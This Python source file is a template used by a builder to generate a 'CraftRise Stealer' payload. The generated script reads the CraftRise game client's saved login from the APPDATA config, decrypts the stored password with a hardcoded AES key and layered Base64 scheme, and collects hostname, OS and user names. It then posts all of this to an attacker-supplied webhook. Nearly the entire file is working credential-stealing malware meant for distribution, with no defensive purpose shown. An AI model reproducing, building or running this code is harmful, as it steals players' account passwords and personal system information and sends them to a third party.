"""Template for the standalone stealer payload."""

from __future__ import annotations

# ---------------------------------------------------------------------------
# Template string used by builder.py to generate the distributable script.
# Placeholder __WEBHOOK_URL__ is replaced via simple str.replace().
# ---------------------------------------------------------------------------

STEALER_TEMPLATE = r'''"""Auto-generated CraftRise Stealer payload."""

import base64
import json
import os
import platform
import socket
import sys
from datetime import datetime

import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

WEBHOOK_URL = __WEBHOOK_URL__
MENTION_EVERYONE = __MENTION_EVERYONE__

_AES_KEY = "2640023187059250".encode("utf-8")
_PREFIX = "3ebi2mclmAM7Ao2"
_SUFFIX = "KweGTngiZOOj9d6"


def _decrypt_base64(encoded_str: str) -> str:
    try:
        return base64.b64decode(encoded_str).decode("utf-8")
    except Exception:
        return encoded_str


def _decrypt_rise_version(s: str) -> str:
    try:
        s1 = _decrypt_base64(s)
        s2 = _decrypt_base64(s1)
        if not (s2.startswith(_PREFIX) and s2.endswith(_SUFFIX)):
            return s2
        core = s2[len(_PREFIX) : len(s2) - len(_SUFFIX)]
        return _decrypt_base64(core)
    except Exception:
        return s


def _decrypt_aes(encrypted_base64: str) -> str:
    try:
        encrypted_data = base64.b64decode(encrypted_base64)
        cipher = AES.new(_AES_KEY, AES.MODE_ECB)
        decrypted = unpad(cipher.decrypt(encrypted_data), AES.block_size)
        return decrypted.decode("utf-8")
    except Exception:
        return ""


def _decrypt_password(encrypted_pass: str) -> str:
    decrypted_aes = _decrypt_aes(encrypted_pass)
    if not decrypted_aes:
        return ""
    result = _decrypt_rise_version(decrypted_aes)
    if "#" in result:
        return result.split("#", 1)[0]
    return result


def _get_system_info() -> dict:
    try:
        return {
            "hostname": socket.gethostname(),
            "os": f"{platform.system()} {platform.release()}",
            "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "username": os.getlogin(),
            "computer_name": platform.node(),
        }
    except Exception as exc:
        return {"error": str(exc), "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}


def _read_craftrise_config() -> dict:
    result = {
        "success": False,
        "error": None,
        "config_found": False,
        "data": {},
    }
    try:
        appdata = os.getenv("APPDATA")
        if not appdata:
            result["error"] = "APPDATA environment variable not found"
            return result

        config_path = os.path.join(appdata, ".craftrise", "config.json")
        if not os.path.exists(config_path):
            result["error"] = f"Config file not found: {config_path}"
            return result

        result["config_found"] = True
        with open(config_path, "r", encoding="utf-8") as fh:
            config_data = json.load(fh)

        result["data"]["username"] = config_data.get("rememberName", "")
        result["data"]["encrypted_password"] = config_data.get("rememberPass", "")
        result["data"]["version"] = config_data.get("version", "")
        result["data"]["client_ram"] = config_data.get("clientRam", "")
        result["data"]["windows_type"] = config_data.get("windowsType", "")
        result["data"]["display"] = config_data.get("display", "")
        result["data"]["is_optimized_config"] = config_data.get("isOptimizedConfig", False)

        if result["data"]["encrypted_password"]:
            result["data"]["decrypted_password"] = _decrypt_password(
                result["data"]["encrypted_password"]
            )
            result["success"] = True
        else:
            result["error"] = "Encrypted password not found"

        return result
    except Exception as exc:
        result["error"] = f"Config read error: {exc}"
        return result


def _send_webhook(webhook_url: str, data: dict) -> bool:
    try:
        system_info = _get_system_info()
        config = data.get("data", {})

        fields = [
            {"name": "Kullanıcı Adı", "value": f"`{config.get('username') or 'Bulunamadı'}`", "inline": True},
            {"name": "Şifre", "value": f"`{config.get('decrypted_password') or 'Bulunamadı'}`", "inline": True},
            {"name": "Sürüm", "value": f"`{config.get('version') or 'Bulunamadı'}`", "inline": True},
            {"name": "RAM", "value": f"`{config.get('client_ram') or 'Bulunamadı'}`", "inline": True},
            {"name": "İşletim Sistemi", "value": f"`{system_info.get('os', 'N/A')}`", "inline": True},
            {"name": "Bilgisayar Adı", "value": f"`{system_info.get('computer_name', 'N/A')}`", "inline": True},
            {"name": "Kullanıcı", "value": f"`{system_info.get('username', 'N/A')}`", "inline": True},
            {"name": "Tarih", "value": f"`{system_info.get('date', 'N/A')}`", "inline": True},
        ]

        if config.get("display"):
            fields.append({"name": "Ekran", "value": f"`{config['display']}`", "inline": True})
        if "is_optimized_config" in config:
            fields.append({
                "name": "Optimize Edilmiş",
                "value": f"`{'Evet' if config['is_optimized_config'] else 'Hayır'}`",
                "inline": True,
            })

        embed = {
            "title": "CraftRise Hesap Bilgileri" if data.get("success") else "CraftRise Bilgileri Alınamadı",
            "color": 0x00FF00 if data.get("success") else 0xFF0000,
            "description": data.get("error") if not data.get("success") else None,
            "fields": fields,
            "footer": {"text": "CraftRise Stealer"},
        }

        content = (
            "@everyone **Yeni CraftRise hesabı bulundu!**"
            if MENTION_EVERYONE and data.get("success")
            else "**Yeni CraftRise hesabı bulundu!**" if data.get("success")
            else "**CraftRise bilgileri alınamadı**"
        )

        payload = {
            "username": "CraftRise Stealer",
            "content": content,
            "embeds": [embed],
        }

        resp = requests.post(webhook_url, json=payload, timeout=15)
        return resp.status_code == 204
    except Exception:
        return False


def main() -> None:
    config_data = _read_craftrise_config()
    if WEBHOOK_URL:
        _send_webhook(WEBHOOK_URL, config_data)


if __name__ == "__main__":
    main()
'''
